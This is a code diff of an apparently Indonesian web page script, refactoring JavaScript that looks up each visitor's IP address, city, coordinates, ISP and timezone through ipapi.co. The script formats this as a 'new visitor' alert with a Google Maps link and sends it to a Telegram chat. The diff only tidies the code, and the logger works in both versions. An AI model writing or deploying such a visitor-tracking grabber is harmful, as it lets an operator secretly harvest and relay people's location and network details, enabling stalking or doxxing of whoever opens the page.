@@ -17,15 +17,12 @@
           body: JSON.stringify({ message: text })
         });
         const data = await res.json();
-
-        if (!data.ok) {
-          document.getElementById('status').innerText = 'Gagal kirim pesan: ' + data.error;
-        } else {
-          document.getElementById('status').innerText = 'Lokasi berhasil dikirim ke Telegram!';
-        }
-      } catch (error) {
+        document.getElementById('status').innerText = data.ok
+          ? 'Lokasi berhasil dikirim ke Telegram!'
+          : 'Gagal kirim pesan: ' + data.error;
+      } catch (err) {
         document.getElementById('status').innerText = 'Terjadi error saat mengirim pesan.';
-        console.error(error);
+        console.error(err);
       }
     }
 
@@ -34,34 +31,21 @@
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        const ip = data.ip || 'N/A';
-        const city = data.city || 'N/A';
-        const region = data.region || 'N/A';
-        const country = data.country_name || 'N/A';
-        const org = data.org || 'N/A';
-        const timezone = data.timezone || 'N/A';
-        const lat = data.latitude || 'N/A';
-        const lon = data.longitude || 'N/A';
-        const timeNow = new Date().toLocaleString();
-
-        const message =
-`🌍 *Pengunjung Baru!*
-
-📡 IP: \`${ip}\`
-🏙️ Kota: ${city}
-🗺️ Wilayah: ${region}
-🌐 Negara: ${country}
-📍 Koordinat: ${lat}, ${lon}
-🏢 ISP/Org: ${org}
-🕒 Waktu Akses: ${timeNow}
-⏱ Zona Waktu: ${timezone}
-🗺️ [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+        const message = `
+🌍 *Pengunjung Baru!* ...
+— IP: \`${data.ip}\`
+— Kota: ${data.city}, ${data.region}, ${data.country_name}
+— Koordinat: ${data.latitude}, ${data.longitude}
+— ISP/Org: ${data.org}
+— Waktu: ${new Date().toLocaleString()}
+— Zona Waktu: ${data.timezone}
+[ Lihat di Google Maps ](https://www.google.com/maps?q=${data.latitude},${data.longitude})
+`;
 
         sendTelegramMessage(message);
-
-      } catch (error) {
+      } catch (err) {
         document.getElementById('status').innerText = 'Gagal mengambil lokasi.';
-        console.error(error);
+        console.error(err);
       }
     }
 
